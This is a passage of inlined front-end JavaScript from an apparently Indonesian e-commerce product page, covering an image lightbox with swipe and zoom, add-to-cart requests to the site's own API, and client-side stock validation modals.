        if (state.swipeMode === 'v') {
          // Ikuti jari, kurangi opacity untuk feedback
          e.preventDefault();
          setRootDrag(dy);
        } else if (state.swipeMode === 'h') {
          // Biarkan sampai touchend untuk menentukan next/prev (tidak perlu preventDefault di sini)
        }
      }
    }, { passive: false });

    canvas.addEventListener('touchend', (e)=>{
      if (!state.open) return;

      if (state.scale <= 1) {
        const dx = state.totalDx;
        const dy = state.totalDy;

        if (state.swipeMode === 'v') {
          const TH = 80; // threshold jarak piksel untuk menutup
          if (Math.abs(dy) > TH) {
            // Animasi keluar arah swipe
            animateClose(dy);
          } else {
            // Snap back
            resetRootDrag(true);
          }
        } else if (state.swipeMode === 'h') {
          if (Math.abs(dx) > 50) { dx < 0 ? next() : prev(); }
        }
      }

      state.isDragging = false;
      state.swipeMode = 'none';
      state.totalDx = 0;
      state.totalDy = 0;
    });
  }

  function setImage(idx){
    if (!state.items.length) return;
    state.idx = (idx + state.items.length) % state.items.length;
    const it = state.items[state.idx];
    imgEl.src = it.src;
    imgEl.alt = it.alt || '';
    counterEl.textContent = (state.idx + 1) + ' / ' + state.items.length;
    resetTransform();
    preloadNeighbors();
  }

  function resetTransform(){
    state.scale = 1;
    state.tx = 0; state.ty = 0;
    applyTransform();
  }

  function setTranslate(tx, ty){
    state.tx = tx; state.ty = ty;
    applyTransform();
  }

  function applyTransform(){
    imgEl.style.transform = `translate3d(${state.tx}px, ${state.ty}px, 0) scale(${state.scale})`;
  }

  function zoomAt(delta, clientX, clientY, snapTo){
    const old = state.scale;
    let next = (typeof snapTo === 'number') ? snapTo : (old + delta);
    next = Math.max(state.minScale, Math.min(state.maxScale, next));

    if (next !== old) {
      const rect = imgEl.getBoundingClientRect();
      const cx = clientX - rect.left - rect.width/2;
      const cy = clientY - rect.top  - rect.height/2;
      state.tx -= cx * (next/old - 1);
      state.ty -= cy * (next/old - 1);
      state.scale = next;
      applyTransform();
    }
  }

  function preloadNeighbors(){
    if (state.items.length < 2) return;
    const nextIdx = (state.idx + 1) % state.items.length;
    const prevIdx = (state.idx - 1 + state.items.length) % state.items.length;
    [nextIdx, prevIdx].forEach(i=>{
      const img = new Image(); img.src = state.items[i].src;
    });
  }

  // ----- Swipe-down visual helpers -----
  function setRootDrag(dy){
    const damped = dy * 0.6; // redam gerakan agar lembut
    const abs = Math.abs(dy);
    const fade = Math.max(0, Math.min(1, 1 - abs / 300)); // transparansi sesuai jarak
    root.style.transform = `translate3d(0, ${damped}px, 0)`;
    root.style.opacity = String(0.95 * fade + 0.05); // jangan jadi 0 total sebelum close
  }
  function resetRootDrag(withAnim){
    if (withAnim) {
      root.style.transition = 'transform .18s ease, opacity .18s ease';
      root.style.transform = 'translate3d(0,0,0)';
      root.style.opacity = '1';
      setTimeout(()=>{ root.style.transition = ''; }, 190);
    } else {
      root.style.transition = '';
      root.style.transform = '';
      root.style.opacity = '';
    }
  }
  function animateClose(dy){
    root.style.transition = 'transform .18s ease, opacity .18s ease';
    const off = (dy > 0 ? window.innerHeight : -window.innerHeight);
    root.style.transform = `translate3d(0, ${off}px, 0)`;
    root.style.opacity = '0';
    setTimeout(()=>{ root.style.transition = ''; close(); }, 180);
  }

  function setSiblingsInert(makeInert){
    // Inert semua saudara root (elemen lain di body) agar fokus tidak lari
    const nodes = Array.from(document.body.children).filter(el => el !== root);
    nodes.forEach(el=>{
      if (makeInert) {
        if (!el.hasAttribute('inert')) el.setAttribute('inert','');
      } else {
        if (el.hasAttribute('inert')) el.removeAttribute('inert');
      }
    });
  }

  function open(idx){
    if (!state.items.length) buildItems();
    if (!state.items.length) return;
    ensureUI();

    // Reset efek drag visual
    resetRootDrag(false);

    document.body.style.overflow = 'hidden';
    root.classList.add('show');
    root.removeAttribute('aria-hidden'); // hindari aria-hidden saat fokus child
    setSiblingsInert(true);

    state.open = true;
    setImage(typeof idx === 'number' ? idx : 0);

    // Fokuskan dialog agar keyboard pasti tertangkap
    try { root.focus(); } catch(_){}
  }

  function close(){
    state.open = false;
    root.classList.remove('show');
    root.setAttribute('aria-hidden','true');
    setSiblingsInert(false);
    document.body.style.overflow = '';

    // Bersihkan transform/opacity
    resetRootDrag(false);
  }

  function next(){ setImage(state.idx + 1); }
  function prev(){ setImage(state.idx - 1); }

  function findIndexByUrl(url){
    const target = fileName(absUrl(url));
    const idx = state.items.findIndex(it => fileName(it.src) === target);
    return idx >= 0 ? idx : 0;
  }

  function initPdLightbox(){
    buildItems();
    ensureUI();

    // Klik gambar utama â†’ buka LB di index yang sama
    const mainImg = document.getElementById('pd-main-img');
    if (mainImg) {
      mainImg.style.cursor = 'zoom-in';
      mainImg.addEventListener('click', ()=>{
        open(findIndexByUrl(mainImg.src));
      });
    }

    // Klik gambar slider mobile â†’ buka LB di gambar yang diketuk
    const slider = document.getElementById('pd-mobile-slider');
    if (slider) {
      slider.addEventListener('click', (e)=>{
        const im = e.target && e.target.tagName === 'IMG' ? e.target : e.target.closest('img');
        if (!im) return;
        open(findIndexByUrl(im.src));
      });
    }

    // (Opsional) double-click pada thumbnail untuk buka langsung
    const thumbs = document.querySelectorAll('.pd-thumb-btn');
    thumbs.forEach((btn)=>{
      let last = 0;
      btn.addEventListener('click', ()=>{
        const now = Date.now();
        if (now - last < 300) {
          const src = btn.getAttribute('data-full') || '';
          open(findIndexByUrl(absUrl(src)));
          last = 0;
        } else {
          last = now;
        }
      });
    });

    // Ekspos API
    window.PDLightbox = { open, close, next, prev, findIndexByUrl };
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', initPdLightbox);
  } else {
    initPdLightbox();
  }
})();
</script>
<script data-inlined="cart.js">
(function(){
  function $(s,ctx=document){ return ctx.querySelector(s); }
  function esc(s){ return String(s||'').replace(/[&<>"']/g, m=>({ '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#039;' }[m])); }
  
  // CSRF token helper
  function getCsrfToken() {
    const metaTag = document.querySelector('meta[name="csrf-token"]');
    return metaTag ? metaTag.getAttribute('content') : '';
  }
  
  function guessPdMeta(){
    const name = (window.PD_NAME !== undefined) ? String(window.PD_NAME) : ($('#pd-title')?.textContent || '');
    const sku  = (function(){ const el=$('#pd-sku'); return el ? el.textContent.trim() : (window.PD_SKU||''); })();
    // SECURITY FIX: Remove price from client-side metadata (will be validated server-side)
    const imgEl = $('#pd-main-img');
    const image_url = imgEl ? (imgEl.getAttribute('src') || '') : '';
    return { name, sku, image_url }; // price removed for security
  }

  async function addToCart(productId, qty=1, variantId=0, metaOpt){
    const meta = Object.assign(guessPdMeta(), metaOpt||{});
    const payload = {
      product_id: parseInt(productId||0,10) || 0,
      qty: parseInt(qty||1,10) || 1,
      variant_id: parseInt(variantId||0,10) || 0,
      meta
    };
    
    // Check if user is logged in
    const isLoggedIn = document.querySelector('meta[name="user-logged-in"]')?.content === 'true' ||
                      document.body.classList.contains('logged-in') ||
                      window.userLoggedIn === true ||
                      document.body.dataset.userLoggedIn === 'true';
    
    // Skip localStorage untuk logged user - mereka pakai database
    if (!isLoggedIn && window.guestCart) {
      try {
        window.guestCart.add(payload.product_id, payload.qty, payload.variant_id, meta);
      } catch (e) {
        console.warn('Failed to add to localStorage cart:', e);
      }
    }
    
    const res = await fetch('/api/cart/add.php', {
      method: 'POST',
      headers: { 
        'Content-Type':'application/json',
        'X-CSRF-Token': getCsrfToken()
      },
      credentials: 'same-origin',
      body: JSON.stringify({
        ...payload,
        csrf_token: getCsrfToken()
      }),
    });
    const data = await res.json().catch(()=>({ ok:false, error:'Gagal menambahkan ke keranjang' }));
    if (!res.ok || !data.ok) {
      const msg = data && data.error ? data.error : 'Gagal menambahkan ke keranjang';
      throw new Error(msg);
    }

    // Update badge di navbar dengan data dari response
    try {
      const el = document.querySelector('[data-role="cart-badge"]') || document.getElementById('cartCount');
      if (el && data.cart && typeof data.cart.items_count === 'number') {
        el.textContent = String(data.cart.items_count);
        el.classList.toggle('is-empty', data.cart.items_count <= 0);
      }
    } catch(_){}

    // Siarkan event global (dipakai cart-badge.js dan halaman lain)
    try {
      document.dispatchEvent(new CustomEvent('cart:updated', { detail: data.cart || {} }));
    } catch(_){}

    // Update CartBadge dengan data dari response (lebih reliable)
    try { 
      if (window.CartBadge && window.CartBadge.set) {
        window.CartBadge.set(data.cart.items_count||0);
      }
    } catch(_){}

    // Tambahan: refresh cart counter setelah delay kecil untuk memastikan data tersinkronisasi
    setTimeout(() => {
      if (window.updateCartCounter) {
        window.updateCartCounter();
      }
    }, 100);

    return data;
  }

  // Function to update cart counter from server
  async function updateCartCounter(){
    try {
      const res = await fetch('/api/cart/get.php', { credentials:'same-origin' });
      const data = await res.json().catch(()=>({ok:false}));
      if (data.ok && typeof data.items_count === 'number') {
        const el = document.querySelector('[data-role="cart-badge"]') || document.getElementById('cartCount');
        if (el) {
          el.textContent = String(data.items_count);
          el.classList.toggle('is-empty', data.items_count <= 0);
        }
        // Dispatch event
        try {
          document.dispatchEvent(new CustomEvent('cart:updated', { detail: { items_count: data.items_count } }));
        } catch(_){}
      }
    } catch (err) {
      console.log('Could not update cart counter:', err);
    }
  }

  // Function to manually merge guest cart (if needed)
  async function mergeGuestCart(){
    try {
      const res = await fetch('/api/cart/merge-guest.php', {
        method: 'POST',
        headers: { 
          'Content-Type': 'application/json',
          'X-CSRF-Token': getCsrfToken()
        },
        credentials: 'same-origin',
        body: JSON.stringify({ csrf_token: getCsrfToken() })
      });
      const data = await res.json().catch(()=>({ok:false}));
      
      if (data.ok && data.merged_items > 0) {
        console.log(`Guest cart merged: ${data.merged_items} items`);
        // Update cart counter after merge
        await updateCartCounter();
        return data;
      }
      return data;
    } catch (err) {
      console.log('Could not merge guest cart:', err);
      return { ok: false, error: err.message };
    }
  }

  window.addToCart = addToCart;
  window.updateCartCounter = updateCartCounter;
  window.mergeGuestCart = mergeGuestCart;

  // Optional: auto-bind untuk tombol apapun yang punya data-addtocart
  document.addEventListener('click', async (e)=>{
    const btn = e.target.closest('[data-addtocart]');
    if (!btn) return;
    e.preventDefault();
    if (btn.disabled) return;

    const pid = parseInt(btn.getAttribute('data-pid')||'0',10);
    const vid = parseInt(btn.getAttribute('data-vid')||'0',10);
    const qty = parseInt(btn.getAttribute('data-qty')||'1',10) || 1;

    try {
      const data = await addToCart(pid, qty, vid);
      if (window.showToast) {
        const meta = guessPdMeta();
        window.showToast({
          type:'success',
          title:'Berhasil ditambahkan',
          message:`<strong>${esc(meta.name)}</strong>${meta.sku?` Â· <em>SKU: ${esc(meta.sku)}</em>`:''}<br>Qty: ${qty}`,
          duration: 3800,
          actions: [
            { label:'Lihat Keranjang', onClick: ()=> { window.location.href='/keranjang'; } },
            { label:'Lanjut Belanja', variant:'alt', onClick: ()=>{} }
          ]
        });
      }
    } catch (err) {
      if (window.showToast) {
        window.showToast({ type:'warn', title:'Gagal', message: String(err?.message||'Gagal menambahkan'), duration: 4200 });
      } else {
        console.error(err);
      }
    }
  });
})();
</script>
<script data-inlined="stock-validator-vanilla.js">
/**
 * Stock Validation - Vanilla JS Version
 * 
 * This script provides client-side stock validation without jQuery dependency
 * - Works with native JavaScript and fetch API
 * - Graceful fallback for older browsers
 * - Same functionality as jQuery version
 */

window.StockValidator = (function() {
    'use strict';

    const config = {
        apiEndpoint: '/api/stock/check.php',
        modalSelector: '#stock-modal-overlay',  // We create our own modal
        loadingClass: 'loading-stock',
        disabledClass: 'stock-disabled',
        debug: true  // Enable debug logging
    };

    /**
     * Cross-browser event listener helper
     */
    function addEventListener(element, event, handler) {
        if (element.addEventListener) {
            element.addEventListener(event, handler);
        } else if (element.attachEvent) {
            element.attachEvent('on' + event, handler);
        }
    }

    /**
     * Get stock information from embedded variant data (instant, no AJAX needed)
     */
    function getStockFromEmbeddedData(variantId) {
        // Check if embedded variant data exists
        if (!window.__PD_VARIANTS_WITH_BRANCH__ || !Array.isArray(window.__PD_VARIANTS_WITH_BRANCH__)) {
            return null;
        }
        
        const variants = window.__PD_VARIANTS_WITH_BRANCH__;
        
        // SPECIAL CASE: Simple product (no variants) - empty array means simple product
        if (variants.length === 0) {
            // For simple products, we cannot determine stock from embedded data
            // Return null to force API validation
            return null;
        }
        
        // If no variant specified, check base product stock (all variants)
        if (!variantId || variantId <= 0) {
            // For base product, check if ANY variant has stock
            const isPreorder = window.isPreorderProduct || false;
            let hasAnyStock = false;
            let totalStock = 0;
            
            if (isPreorder) {
                // For pre-order, check preorder_remaining
                hasAnyStock = variants.some(v => {
                    if ('preorder_remaining' in v && v.preorder_remaining !== null) {
                        return v.preorder_remaining > 0;
                    }
                    return v.stock > 0;
                });
                totalStock = variants.reduce((sum, v) => {
                    if ('preorder_remaining' in v && v.preorder_remaining !== null) {
                        return sum + (v.preorder_remaining || 0);
                    }
                    return sum + (v.stock || 0);
                }, 0);
            } else {
                hasAnyStock = variants.some(v => v.stock > 0);
                totalStock = variants.reduce((sum, v) => sum + (v.stock || 0), 0);
            }
            
            return {
                hasStock: hasAnyStock,
                stock: totalStock,
                sku: 'Base Product',
                variant: null
            };
        }
        
        // Find specific variant
        const variant = variants.find(v => v.id === variantId);
        
        if (!variant) {
            return {
                hasStock: false,
                stock: 0,
                sku: 'Unknown Variant',
                variant: null
            };
        }
        
        // For pre-order products, check preorder_remaining instead of stock
        const isPreorder = window.isPreorderProduct || false;
        let hasStock = false;
        let availableStock = 0;
        
        if (isPreorder && 'preorder_remaining' in variant && variant.preorder_remaining !== null) {
            availableStock = parseInt(variant.preorder_remaining, 10);
            if (isNaN(availableStock)) availableStock = 0;
            hasStock = availableStock > 0;
        } else {
            availableStock = variant.stock || 0;
            hasStock = availableStock > 0;
        }
        
        return {
            hasStock: hasStock,
            stock: availableStock,
            sku: variant.sku,
            variant: variant
        };
    }

    /**
     * Cross-browser AJAX helper
     */
    function makeRequest(url, options) {
        return new Promise((resolve, reject) => {
            // Try fetch first (modern browsers)
            if (typeof fetch !== 'undefined') {
                const fetchOptions = {
                    method: options.method || 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                    },
                    body: options.data ? new URLSearchParams(options.data).toString() : null
                };

                fetch(url, fetchOptions)
                    .then(response => {
                        if (!response.ok) {
                            throw new Error(`HTTP ${response.status}`);
                        }
                        return response.json();
                    })
                    .then(resolve)
                    .catch(reject);
            } else {
                // Fallback to XMLHttpRequest
                const xhr = new XMLHttpRequest();
                xhr.open(options.method || 'POST', url);
                xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                
                xhr.onload = function() {
                    if (xhr.status >= 200 && xhr.status < 300) {
                        try {
                            resolve(JSON.parse(xhr.responseText));
                        } catch (e) {
                            reject(new Error('Invalid JSON response'));
                        }
                    } else {
                        reject(new Error(`HTTP ${xhr.status}`));
                    }
                };
                
                xhr.onerror = function() {
                    reject(new Error('Network error'));
                };
                
                const data = options.data ? new URLSearchParams(options.data).toString() : null;
                xhr.send(data);
            }
        });
    }

    /**
     * Check stock via AJAX
     */
    function checkStock(productId, variantId, qty) {
        return makeRequest(config.apiEndpoint, {
            method: 'POST',
            data: {
                product_id: productId,
                variant_id: variantId || 0,
                qty: qty || 1
            }
        });
    }

    /**
     * Create and show stock alert modal using modal.css structure
     */
    function showStockModal(stockInfo, action = 'add to cart') {
        let title, message, type, iconClass;

        // Handle both string and object formats
        if (typeof stockInfo === 'string') {
            title = 'Stok Tidak Tersedia';
            message = stockInfo;
            type = 'warning';
            iconClass = 'warning';
        } else if (stockInfo && typeof stockInfo === 'object') {
            if (!stockInfo.is_active) {
                title = 'Produk Tidak Tersedia';
                message = 'Maaf, produk ini sudah tidak aktif atau telah dihapus dari katalog.';
                type = 'danger';
                iconClass = 'danger';
            } else if (!stockInfo.is_in_stock) {
                title = 'Stok Habis';
                message = `<strong>${stockInfo.product_name || 'Produk ini'}</strong> sedang habis stok. Silakan pilih varian lain atau tunggu restock.`;
                if (stockInfo.sku) {
                    message += `<br><small style="color: #64748b;">SKU: ${stockInfo.sku}</small>`;
                }
                type = 'warning';
                iconClass = 'warning';
            } else if (!stockInfo.can_add_to_cart) {
                title = 'Stok Tidak Mencukupi';
                message = `Stok <strong>${stockInfo.product_name || 'produk'}</strong> tidak mencukupi.<br>`;
                message += `Tersedia: <strong>${stockInfo.available_stock}</strong>, diminta: <strong>${stockInfo.requested_qty}</strong><br>`;
                message += `Silakan kurangi jumlah atau pilih varian lain.`;
                type = 'warning';
                iconClass = 'warning';
            } else {
                title = 'Stok Tidak Tersedia';
                message = stockInfo.message || 'Produk ini tidak dapat ditambahkan ke keranjang saat ini.';
                type = 'warning';
                iconClass = 'warning';
            }
        } else {
            title = 'Stok Tidak Tersedia';
            message = 'Produk ini tidak dapat ditambahkan ke keranjang saat ini.';
            type = 'warning';
            iconClass = 'warning';
        }

        // Create modal HTML using modal.css structure
        const modalHTML = `
            <div class="modal-overlay" id="stock-modal-overlay">
                <div class="modal-dialog">
                    <div class="modal-header">
                        <div class="modal-icon ${iconClass}">
                            ${getIconSVG(iconClass)}
                        </div>
                        <h3 class="modal-title">${title}</h3>
                    </div>
                    <div class="modal-body">
                        <p class="modal-message">${message}</p>
                        <div class="modal-actions">
                            <button type="button" class="modal-btn modal-btn-secondary" data-action="close">
                                Tutup
                            </button>
                            <button type="button" class="modal-btn modal-btn-primary" data-action="reload">
                                Muat Ulang
                            </button>
                        </div>
                    </div>
                </div>
            </div>
        `;

        // Remove existing modal if any
        const existingModal = document.getElementById('stock-modal-overlay');
        if (existingModal) {
            existingModal.remove();
        }

        // Add modal to body
        document.body.insertAdjacentHTML('beforeend', modalHTML);
        
        // Show modal with animation
        const modal = document.getElementById('stock-modal-overlay');
        setTimeout(() => {
            modal.classList.add('show');
        }, 10);

        // Add event listeners to modal buttons
        const closeBtn = modal.querySelector('[data-action="close"]');
        const reloadBtn = modal.querySelector('[data-action="reload"]');
        
        if (closeBtn) {
            addEventListener(closeBtn, 'click', closeStockModal);
        }
        
        if (reloadBtn) {
            addEventListener(reloadBtn, 'click', function() {
                closeStockModal();
                window.location.reload();
            });
        }

        // Close modal when clicking overlay
        addEventListener(modal, 'click', function(event) {
            if (event.target === modal) {
                closeStockModal();
            }
        });

        // Auto-close after 8 seconds
        setTimeout(() => {
            closeStockModal();
        }, 8000);
    }

    /**
     * Get icon SVG based on type
     */
    function getIconSVG(type) {
        const icons = {
            danger: '<svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>',
            warning: '<svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><path d="M1 21h22L12 2 1 21zm12-3h-2v-2h2v2zm0-4h-2v-4h2v4z"/></svg>',
            success: '<svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>',
            info: '<svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"/></svg>'
        };
        return icons[type] || icons.info;
    }

    /**
     * Close stock modal
     */
    function closeStockModal() {
        const modal = document.getElementById('stock-modal-overlay');
        if (modal) {
            modal.classList.remove('show');
            setTimeout(() => {
                modal.remove();
            }, 200);
        }
    }

    // Make closeStockModal globally available
    if (typeof window !== 'undefined') {
        window.closeStockModal = closeStockModal;
    }

    /**
     * Get element data attribute with fallback
     */
    function getDataAttribute(element, attr) {
        if (element.dataset) {
            return element.dataset[attr];
        } else {
            return element.getAttribute('data-' + attr);
        }
    }

    /**
     * Validate stock before cart action
     */
    async function validateBeforeCart(productId, variantId, qty, action = 'add') {
        try {
            // SMART VALIDATION: For simple products, check if we already have cached stock info
            // If buttons are enabled and cached info shows stock available, skip API validation
            if (window._currentStockInfo && window._currentStockInfo.can_add_to_cart) {
        
                return true;
            }
            
            // For variant products or when cached info is not available, do API validation
            const stockInfo = await checkStock(productId, variantId, qty);
            
            if (!stockInfo.ok) {
                showStockModal({ 
                    message: stockInfo.error || 'Gagal mengecek stok',
                    is_active: false 
                }, action);
                return false;
            }

            if (!stockInfo.can_add_to_cart) {
                showStockModal(stockInfo, action);
                return false;
            }

            return true; // Stock available, proceed

        } catch (error) {
            console.error('Stock validation error:', error);
            showStockModal({ 
                message: 'Terjadi kesalahan saat mengecek stok. Silakan coba lagi.',
                is_active: false 
            }, action);
            return false;
        }
    }

    /**
     * Handle button click with stock validation
     */
    function handleButtonClick(event, action) {
        const button = event.target;
        
        
        // FIRST CHECK: Is button marked as stock-blocked? (Anti-tampering)
        if (button.hasAttribute('data-stock-blocked')) {
            event.preventDefault();
            event.stopImmediatePropagation();
            
            const reason = button.getAttribute('data-stock-reason') || 'Stok tidak tersedia';
            showStockModal(reason);
            
            // Show security warning
            if (window.showToast) {
                window.showToast({
                    type: 'warning',
                    title: 'Aksi Tidak Diizinkan',
                    message: 'Produk ini sedang habis stok. Silakan pilih varian lain.',
                    duration: 3000
                });
            }
            return false;
        }
        
        // SECOND CHECK: Real-time stock validation against cached stock info
        if (window._currentStockInfo && !window._currentStockInfo.can_add_to_cart) {
            event.preventDefault();
            event.stopImmediatePropagation();
            
            showStockModal(window._currentStockInfo.message || 'Stok tidak tersedia');
            
            // Re-enforce button disabling
            button.disabled = true;
            button.style.opacity = '0.5';
            button.style.cursor = 'not-allowed';
            button.setAttribute('data-stock-blocked', 'true');
            
            return false;
        }
        
        // Skip if already processing
        if (button.classList.contains(config.loadingClass)) {
            event.preventDefault();
            return false;
        }

        // Get product data from button attributes or form
        let productId = parseInt(getDataAttribute(button, 'productId') || getDataAttribute(button, 'product-id') || 0);
        let variantId = parseInt(getDataAttribute(button, 'variantId') || getDataAttribute(button, 'variant-id') || 0);
        let qty = parseInt(getDataAttribute(button, 'qty') || 1);

        // Try to get from global variables (set by product detail page)
        if (productId <= 0 && typeof window.PD_ID !== 'undefined') {
            productId = parseInt(window.PD_ID || 0);
        }

        // Try to get from parent form if not in button
        if (productId <= 0) {
            const form = button.closest ? button.closest('form') : null;
            if (form) {
                const pidAttr = form.getAttribute('data-pid');
                const pidInput = form.querySelector('[name="product_id"]');
                const vidInput = form.querySelector('[name="variant_id"]');
                const qtyInput = form.querySelector('[name="qty"]');
                
                if (pidAttr) productId = parseInt(pidAttr);
                if (pidInput) productId = parseInt(pidInput.value || 0);
                if (vidInput) variantId = parseInt(vidInput.value || 0);
                if (qtyInput) qty = parseInt(qtyInput.value || 1);
            }
        }

        // CRITICAL: Always get current variant from selector (overrides button attributes)
        // This ensures we validate against the currently selected variant, not cached button data
        const variantSelector = document.getElementById('pd-variant-id');
        if (variantSelector) {
            const currentVariantId = parseInt(variantSelector.value || 0);
            if (currentVariantId > 0) {
                variantId = currentVariantId;
            }
        }


        if (productId <= 0) {
            return true; // Let default handler deal with it
        }

        // Prevent default and validate stock
        event.preventDefault();
        event.stopPropagation();
        
        // Show loading state
        button.classList.add(config.loadingClass);
        const originalDisabled = button.disabled;
        button.disabled = true;
        
        
        validateBeforeCart(productId, variantId, qty, action)
            .then(isValid => {
                if (isValid) {
                    // Stock OK, proceed with original action
                    if (action === 'cart' && typeof window.addToCart === 'function') {
                        window.addToCart(productId, qty, variantId);
                    } else if (action === 'buy' && typeof window.buyNow === 'function') {
                        // Call buyNow from pd-buynow.js without parameters (it gets data internally)
                        window.buyNow();
                    } else {
                        // Add fallback cart/buy logic here if needed
                    }
                }
            })
            .catch(error => {
            })
            .finally(() => {
                // Remove loading state
                button.classList.remove(config.loadingClass);
                button.disabled = originalDisabled;
            });

        return false;
    }

    /**
     * Handle mobile button click with stock validation
     */
    function handleMobileButtonClick(event, action) {
        const button = event.target;
        
        
        // FIRST CHECK: Is button marked as stock-blocked? (Anti-tampering)
        if (button.hasAttribute('data-stock-blocked')) {
            event.preventDefault();
            event.stopImmediatePropagation();
            
            const reason = button.getAttribute('data-stock-reason') || 'Stok tidak tersedia';
            showStockModal(reason);
            
            // Show security warning
            if (window.showToast) {
                window.showToast({
                    type: 'warning',
                    title: 'Aksi Tidak Diizinkan',
                    message: 'Produk ini sedang habis stok. Silakan pilih varian lain.',
                    duration: 3000
                });
            }
            return false;
        }
        
        // SECOND CHECK: Real-time stock validation against cached stock info
        if (window._currentStockInfo && !window._currentStockInfo.can_add_to_cart) {
            event.preventDefault();
            event.stopImmediatePropagation();
            
            showStockModal(window._currentStockInfo.message || 'Stok tidak tersedia');
            
            // Re-enforce button disabling
            button.disabled = true;
            button.style.opacity = '0.5';
            button.style.cursor = 'not-allowed';
            button.setAttribute('data-stock-blocked', 'true');
            
            return false;
        }
        
        // Skip if already processing
        if (button.classList.contains(config.loadingClass)) {
            event.preventDefault();
            return false;
        }

        // Get product data from mobile FAB container
        let productId = 0;
        let variantId = 0;
        let qty = 1;

        // Try to get from mobile FAB data-pid
        const mobileFab = document.getElementById('pd-mobile-fab');
        if (mobileFab) {
            const pidAttr = getDataAttribute(mobileFab, 'pid');
            if (pidAttr) productId = parseInt(pidAttr);
        }

        // Try to get from global variables (set by product detail page)
        if (productId <= 0 && typeof window.PD_ID !== 'undefined') {
            productId = parseInt(window.PD_ID || 0);
        }

        // CRITICAL: Always get current variant from selector (real-time)
        // This ensures we validate against the currently selected variant
        const variantSelector = document.getElementById('pd-variant-id');
        if (variantSelector) {
            variantId = parseInt(variantSelector.value || 0);
        }

        // Try to get quantity from quantity input
        const qtySelector = document.querySelector('[name="qty"]');
        if (qtySelector) {
            qty = parseInt(qtySelector.value || 1);
        }
        
        // Ensure minimum quantity is 1
        qty = Math.max(1, qty);


        if (productId <= 0) {
            return true; // Let default handler deal with it
        }

        // Event already prevented at interceptor level, just proceed with validation
        
        // Show loading state
        button.classList.add(config.loadingClass);
        const originalDisabled = button.disabled;
        const originalText = button.textContent;
        button.disabled = true;
        button.textContent = action === 'cart' ? 'Validasi...' : 'Validasi...';
        
        
        // PREEMPTIVE BLOCKING: Set blocking flags BEFORE validation to prevent race conditions
        if (window.addToCart && typeof window.addToCart === 'function') {
            window.addToCart._stockValidatorBlocked = true;
        }
        
        // Also preemptively block other cart functions
        const originalAddToCartSubmit = window.addToCartSubmit;
        const originalPdAddToCartSubmit = window._pdAddToCartSubmit;
        
        // Temporarily block ALL cart functions during validation
        window.addToCartSubmit = (...args) => {
            return Promise.resolve(false);
        };
        
        if (originalPdAddToCartSubmit) {
            window._pdAddToCartSubmit = (...args) => {
                return Promise.resolve(false);
            };
        }
        
        validateBeforeCart(productId, variantId, qty, action)
            .then(isValid => {
                if (isValid) {
                    // Stock OK, proceed with original action
                    
                    if (action === 'cart') {
                        // For mobile cart, we need to recreate the original behavior
                        // Strategy: Try multiple methods to ensure cart add + toast success
                        
                        
                        let cartAddSuccess = false;
                        let errorMessage = '';
                        
                        // Method 1: Try original addToCart function
                        const originalAddToCart = window.addToCart && window.addToCart._original;
                        if (originalAddToCart && !cartAddSuccess) {
                            try {
                                const result = originalAddToCart(productId, qty, variantId);
                                
                                // Handle both sync and async returns
                                if (result && typeof result.then === 'function') {
                                    result.then(() => {
                                        cartAddSuccess = true;
                                    }).catch(err => {
                                        errorMessage = err.message || 'addToCart failed';
                                    });
                                } else {
                                    cartAddSuccess = true;
                                }
                            } catch (error) {
                                errorMessage = error.message || 'addToCart exception';
                            }
                        }
                        
                        // Method 2: Try pd-addtocart.js function (backup method)
                        if (typeof window._pdAddToCartSubmit === 'function' && !cartAddSuccess) {
                            try {
                                
                                // Create fake form for pd-addtocart.js
                                const fakeForm = document.createElement('form');
                                const qtyInput = document.createElement('input');
                                qtyInput.name = 'qty';
                                qtyInput.value = qty;
                                fakeForm.appendChild(qtyInput);
                                
                                // Set variant selector value for pd-addtocart to read
                                const variantSelector = document.getElementById('pd-variant-id');
                                if (variantSelector) {
                                    variantSelector.value = variantId;
                                }
                                
                                const fakeEvent = { 
                                    preventDefault: () => {},
                                    target: fakeForm
                                };
                                
                                // Call pd-addtocart.js function (this should handle toast internally)
                                const result = window._pdAddToCartSubmit(fakeEvent, productId);
                                if (result && typeof result.then === 'function') {
                                    result.then(() => {
                                        cartAddSuccess = true;
                                    });
                                } else {
                                    cartAddSuccess = true;
                                }
                            } catch (error) {
                            }
                        }
                        
                        // Method 3: Direct addToCart call (fallback)
                        if (typeof window.addToCart === 'function' && !cartAddSuccess) {
                            try {
                                const result = window.addToCart(productId, qty, variantId);
                                if (result && typeof result.then === 'function') {
                                    result.then(() => {
                                        cartAddSuccess = true;
                                    });
                                } else {
                                    cartAddSuccess = true;
                                }
                            } catch (error) {
                            }
                        }
                        
                        // Always show success toast for mobile (regardless of which method worked)
                        // This ensures user gets feedback for successful cart addition
                        setTimeout(() => {
                            if (window.showToast) {
                                
                                // Get product details for toast
                                const getVariantSummaryText = () => {
                                    const vs = document.getElementById('pd-variant-summary');
                                    if (!vs) return '';
                                    const items = Array.from(vs.querySelectorAll('.vs-item strong'))
                                        .map(el => el.textContent.trim())
                                        .filter(Boolean);
                                    return items.length ? items.join(' / ') : '';
                                };
                                
                                const escapeHtml = (s) => String(s||'').replace(/[&<>"']/g, m=>({
                                    '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#039;'
                                }[m]));
                                
                                const variantText = getVariantSummaryText();
                                const skuText = (function(){ 
                                    const el = document.getElementById('pd-sku'); 
                                    return el ? el.textContent.trim() : (window.PD_SKU || 'N/A'); 
                                })();
                                const productName = window.PD_NAME || 'Product';
                                
